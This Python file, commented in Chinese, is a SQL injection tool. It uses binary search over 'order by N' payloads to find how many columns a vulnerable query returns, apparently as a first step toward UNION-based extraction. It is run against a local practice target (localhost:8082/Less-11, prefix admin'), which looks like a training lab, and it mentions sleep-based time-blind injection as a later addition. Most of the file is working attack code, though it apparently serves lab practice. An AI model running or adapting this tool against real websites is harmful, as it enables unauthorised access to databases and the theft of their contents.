"""
列数探测（order by 二分）。

核心思路：
    order by N 在 N <= 列数时正常返回（页面含判断标志），
    N 超过列数时 SQL 报错（页面不含判断标志）。
    用二分找到"最大的合法 N"，就是列数。

说明：
    本文件目前只实现"列数探测"，还没有实现真正的时间盲注。
    时间盲注可用 if(条件, sleep(n), 0) 配合响应耗时来判断，后续再补。

名词说明（与 sqli_blind.py 一致）：
    prefix   闭合原 SQL 语句引号部分的注入前缀，如 -1'
    suffix   注释原查询剩余部分的注释符，如 " -- "
    keyword  判断标志：页面"有数据"时才出现的一段文字
"""

import requests

from sqli_blind import SQLInjection


class UnionInjection(SQLInjection):
    """通过 order by 二分探测列数。"""

    def action(self):
        # 一步完成：没有判断标志就先自动探测，再探测列数
        if not self.keyword and not self.detect_keyword():
            return None
        return self.get_count()

    @staticmethod
    def is_error(text):
        error_keywords = ["Unknown column",
        "You have an error in your SQL syntax",
        "mysql_",
        "Warning: mysqli",
        "error in your SQL",
        "MySQL",
        "SQL syntax",
        "Unknown column '3' in 'order clause'"]
        return any(k in text for k in error_keywords)

    def get_count(self):
        # 二分：order by mid 合法 → 列数 >= mid → 往大找；报错 → 往小找
        param = self._resolve_param()
        low = 1
        high = 50
        answer = 0

        while low <= high:
            mid = (low + high) // 2
            payload = f"{self.prefix} order by {mid}{self.suffix}"
            self.log_info(f"[+] {payload}")
            try:
                response = self._get(param, payload)
            except requests.RequestException as ex:
                self.log_error(f"[-] {ex} {payload}")
                return None

            if self.is_error(response.text):

                high = mid - 1
            else:
                answer = mid
                low = mid + 1

        self.log_info(f"[+] 列数：{answer}")
        return answer


if __name__ == "__main__":
    g = UnionInjection(
        "http://localhost:8082/Less-11/?uname=&passwd&submit=Submit",
        columns="password",
        prefix="admin'",

         op="or",
         method="POST",
         extra_params={"submit":"Submit","passwd":"admin"})
    print("列数:", g.action())
